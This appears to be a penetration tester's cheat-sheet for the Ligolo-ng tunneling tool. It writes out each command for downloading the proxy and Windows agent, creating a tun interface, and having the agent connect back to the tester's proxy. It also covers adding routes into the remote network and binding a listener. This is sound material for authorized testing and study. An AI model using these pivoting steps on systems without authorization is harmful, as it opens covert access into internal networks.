> Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).
> 
> Instead of using a SOCKS proxy or TCP/UDP forwarders, Ligolo-ng creates a userland network stack using Gvisor.
> When running the relay/proxy server, a tun interface is used, packets sent to this interface are translated, and then transmitted to the agent remote network.


#Port_Forwarding #Tunneling

Download linux proxy binary
```
https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
```
```
tar -zxvf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
```

Download windows agent binary
```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip
```
```
unzip ligolo-ng_agent_0.4.4_windows_amd64.zip
```

Setup Ligolo-ng (Linux)
```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

Start proxy (Linux)
```
./proxy -selfcert
```

Execute agent (Windows)
```
.\agent.exe -connect 192.168.69.169:11601 -ignore-cert
```

Select the agent
```
session
```

Add a route on the proxy/relay server (Linux)
```
sudo ip route add 192.168.69.0/24 dev ligolo
```

Agent Binding/Listening
```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```